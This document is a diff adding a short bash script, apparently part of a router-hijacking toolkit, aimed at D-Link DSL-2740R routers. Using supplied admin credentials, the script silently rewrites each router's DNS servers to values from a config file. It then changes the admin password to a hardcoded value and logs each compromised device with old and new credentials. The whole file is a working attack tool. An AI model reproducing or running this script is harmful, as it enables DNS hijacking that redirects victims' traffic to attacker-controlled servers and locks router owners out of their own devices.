@@ -1,0 +1,18 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "Enable_DNSFollowing=1&dnsPrimary=$DNS1&dnsSecondary=$DNS2" "http://$HOSTNAME/Forms/dns_1" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" -d "textPassword_OldPasswd=$PASSWORD&textPassword_NewPasswd=$PASSWD&textPassword_ConfirmPasswd=$PASSWD&textPasswordButton_Apply=Apply+Settings" "http://$HOSTNAME/Forms/password_1" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://$HOSTNAME $USERNAME:$PASSWORD [D-LINK DSL-2740R]"
+echo "http://$HOSTNAME ($USERNAME:$PASSWORD => $PASSWD) [D-LINK DSL-2740R]" >> logs/modificados.log
